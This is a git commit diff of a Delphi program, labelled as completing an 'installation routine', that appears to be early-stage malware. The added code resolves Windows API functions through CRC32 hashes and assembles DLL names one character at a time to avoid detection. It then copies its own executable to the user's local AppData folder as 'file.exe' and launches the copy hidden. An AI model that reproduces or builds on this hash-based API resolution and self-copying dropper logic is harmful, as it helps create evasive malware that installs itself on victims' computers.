23aec1c4e1513d7bc8d17c61ef5ac2ef09ece081
exAphex <aydin.tekin.66@hotmail.de>
2015-08-05 14:40:09 +0200

    Completed installation routine

--- Project1.dpr
+++ Project1.dpr
@@ -1,72 +1,60 @@
 program Project1;
 
 uses
-  Windows;
+  Windows, ShellAPI, shfolder;
 
 type
   TAPIRec = packed record
-    hKernel32, hUser32, hShell32 : Cardinal;
+    hKernel32, hUser32, hShell32, hShFolder : Cardinal;
     xExitProcess:procedure(uExitCode: UINT); stdcall;
     xLoadLibraryA:function(lpLibFileName: PChar): Cardinal; stdcall;
-    xMessageBoxA:function(hWnd: HWND; lpText, lpCaption: PAnsiChar; uType: UINT): Integer; stdcall;
+    xMessageBoxW:function(hWnd: HWND; lpText, lpCaption: PWideChar; uType: UINT): Integer; stdcall;
     xVirtualAlloc:function(lpvAddress: Pointer; dwSize, flAllocationType, flProtect: DWORD): Pointer; stdcall;
     xGetModuleFileNameW:function(hModule: HINST; lpFilename: PWideChar; nSize: DWORD): DWORD; stdcall;
     xlstrlenW:function(lpString: PWideChar): Integer; stdcall;
     xlstrcmpW:function(lpString1, lpString2: PWideChar): Integer; stdcall;
     xlstrcatW:function(lpString1, lpString2: PWideChar): PWideChar; stdcall;
+    xCopyFileW:function(lpExistingFileName, lpNewFileName: PWideChar; bFailIfExists: BOOL): BOOL; stdcall;
+    xShellExecuteW:function(hWnd: HWND; Operation, FileName, Parameters, Directory: PWideChar; ShowCmd: Integer): HINST; stdcall;
+    xSHGetFolderPathW:function(hwnd: HWND; csidl: Integer; hToken: THandle; dwFlags: DWORD; pszPath: PWideChar): HResult; stdcall;
   end;
   PAPIRec = ^TAPIRec;
-  
+
 function AllocMem(pAPI:PAPIRec; dwSize:Cardinal):Pointer;
 begin
   Result := pAPI.xVirtualAlloc(nil, dwSize, MEM_COMMIT, PAGE_READWRITE);
 end;
 
-function LastDelimiter(pAPI:PAPIRec; S: PWideChar; Delimiter: WideChar): Integer;
-var
-  i: Integer;
-begin
-  result := -1;
-  i := pAPI.xlstrlenW(s);
-  if (i = 0) then
-    Exit;
-  while S[i] <> Delimiter do
-  begin
-    if i < 0 then
-      break;
-    dec(i);
-  end;
-  result := i;
-end;
-
-procedure ExtractFilePath(pAPI:PAPIRec; szFileName:PWideChar);
-var
-  I: Integer;
-  strSlash:Array[0..1] of WideChar;
-begin
-  strSlash[0] := '\';strSlash[0] := #0;
-  I := LastDelimiter(pAPI, szFilename, strSlash[0]) * 2;
-  ZeroMemory(Pointer(DWORD(szFileName) + i), (lstrlenW(szFileName) * 2) - i);
-end;
-
 function GetCurrentDir(pAPI:PAPIRec):PWideChar;
-var
-  strSlash:Array[0..1] of WideChar;
 begin
-  strSlash[0] := '\';strSlash[0] := #0;
   Result := AllocMem(pAPI, MAX_PATH * 2);
   if Result <> nil then
-  begin
     pAPI.xGetModuleFileNameW(0, Result, MAX_PATH * 2);
-    ExtractFilePath(pAPI, Result);
-    if pAPI.xlstrcmpW(PWideChar(DWORD(Result) + ((pAPI.xlstrlenW(Result) - 1) * 2) ), @strSlash) <> 0 then
-      pAPI.xlstrcatW(Result, @strSlash);
-  end;
 end;
 
-procedure CopyMySelf(pGetProcAddress, pGetModuleHandle:Cardinal);
+function LocalAppDataPath(pAPI:PAPIRec): PWideChar;
+const
+  SHGFP_TYPE_CURRENT = 0;
+var
+  strFileName:Array[0..11] of WideChar;
 begin
+  strFileName[0]:='\';strFileName[1]:='f';strFileName[2]:='i';strFileName[3]:='l';strFileName[4]:='e';strFileName[5]:='.';strFileName[6]:='e';strFileName[7]:='x';strFileName[8]:='e';strFileName[9]:=#0;
+  Result := AllocMem(pAPI, MAX_PATH * 2);
+  pAPI.xSHGetFolderPathW(0, CSIDL_LOCAL_APPDATA, 0, SHGFP_TYPE_CURRENT, Result);
+  pAPI.xlstrcatW(Result, '\file.exe');
+end;
 
+procedure CopyMySelf(pAPI:PAPIRec);
+var
+  pCurrDirectory, pDestinationDirectory:PWideChar;
+begin
+  pCurrDirectory := GetCurrentDir(pAPI);
+  pDestinationDirectory := LocalAppDataPath(pAPI);
+  if pAPI.xlstrcmpw(pCurrDirectory, pDestinationDirectory) <> 0 then
+  begin
+    pAPI.xCopyFileW(pCurrDirectory, pDestinationDirectory, False);
+    pAPI.xShellExecuteW(0, nil, pDestinationDirectory, nil, nil, 0);
+  end;
 end;
 
 procedure resolver;
@@ -74,11 +62,14 @@ procedure resolver;
   var
     strUser32:Array[0..10] of Char;
     strShell32:Array[0..11] of Char;
+    strShFolder:Array[0..12] of Char;
   begin
     strUser32[0]:='u';strUser32[1]:='s';strUser32[2] := 'e';strUser32[3]:='r';strUser32[4]:='3';strUser32[5]:='2';strUser32[6]:='.';strUser32[7]:='d';strUser32[8]:='l';strUser32[9]:='l';strUser32[10]:=#0;
     strShell32[0]:='s';strShell32[1]:='h';strShell32[2]:='e';strShell32[3]:='l';strShell32[4]:='l';strShell32[5]:='3';strShell32[6]:='2';strShell32[7]:='.';strShell32[8]:='d';strShell32[9]:='l';strShell32[10]:='l';strShell32[11]:=#0;
+    strShFolder[0]:='s';strShFolder[1]:='h';strShFolder[2]:='f';strShFolder[3]:='o';strShFolder[4]:='l';strShFolder[5]:='d';strShFolder[6]:='e';strShFolder[7]:='r';strShFolder[8]:='.';strShFolder[9]:='d';strShFolder[10]:='l';strShFolder[11]:='l';strShFolder[12]:=#0;
     pAPI.hUser32 := pAPI.xLoadLibraryA(@strUser32[0]);
     pAPI.hShell32 := pAPI.xLoadLibraryA(@strShell32[0]);
+    pAPI.hShFolder := pAPI.xLoadLibraryA(@strShFolder[0]);
   end;
 
   function CalcCrc32(lpSource:PChar; nLength:Integer):Cardinal;stdcall;
@@ -129,6 +120,23 @@ procedure resolver;
     end;
   end;
 
+  procedure LoadAPIs(pAPI:PAPIRec; hKernel32:Cardinal);
+  begin
+    pAPI.hKernel32 := hKernel32;
+    pAPI.xLoadLibraryA := GetProcAddressEx(hKernel32, $3FC1BD8D, 12);
+    LoadLib(pAPI);
+    pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
+    pAPI.xMessageBoxW := GetProcAddressEx(pAPI.hUser32, $A3F9E8DF, 11);
+    pAPI.xVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
+    pAPI.xGetModuleFileNameW := GetProcAddressEx(hKernel32, $FC6B42F1, 18);
+    pAPI.xlstrlenW := GetProcAddressEx(hKernel32, $1DDA9F5D, 8);
+    pAPI.xlstrcmpW := GetProcAddressEx(hKernel32, $9FEBE16C, 8);
+    pAPI.xlstrcatW := GetProcAddressEx(hKernel32, $F29DDD0C, 8);
+    pAPI.xCopyFileW := GetProcAddressEx(hKernel32, $F54D69C8, 9);
+    pAPI.xShellExecuteW := GetProcAddressEx(pAPI.hShell32, $1FA8A1D9, 13);
+    pAPI.xSHGetFolderPathW := GetProcAddressEx(pAPI.hShell32, $C7652B3F, 16);
+  end;
+
 var
   hModule:Cardinal;
   hKernel32:Cardinal;
@@ -150,18 +158,12 @@ begin
     MOV hModule, EAX
   end;
   @pVirtualAlloc := GetProcAddressEx(hKernel32, $09CE0D4A, 12);
+  //API resolution
   pAPI := pVirtualAlloc(nil, SizeOf(TAPIRec) , MEM_COMMIT, PAGE_READWRITE);
-  pAPI.hKernel32 := hKernel32;
-  pAPI.xLoadLibraryA := GetProcAddressEx(hKernel32, $3FC1BD8D, 12);
-  LoadLib(pAPI);
-  pAPI.xExitProcess := GetProcAddressEx(hKernel32, $251097CC, 11);
-  pAPI.xMessageBoxA := GetProcAddressEx(pAPI.hUser32, $572D5D8E, 11);
-  pAPI.xVirtualAlloc := pVirtualAlloc;
-  pAPI.xGetModuleFileNameW := GetProcAddressEx(hKernel32, $FC6B42F1, 18);
-  pAPI.xlstrlenW := GetProcAddressEx(hKernel32, $1DDA9F5D, 8);
-  pAPI.xlstrcmpW := GetProcAddressEx(hKernel32, $9FEBE16C, 8);
-  pAPI.xlstrcatW := GetProcAddressEx(hKernel32, $F29DDD0C, 8);
-  pAPI.xMessageBoxA(0, nil, nil, 0);
+  LoadAPIs(pAPI, hKernel32);
+  pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
+  CopyMySelf(pAPI);
+  pAPI.xMessageBoxW(0, GetCurrentDir(pAPI), nil, 0);
   pAPI.xExitProcess(0);
 end;
 
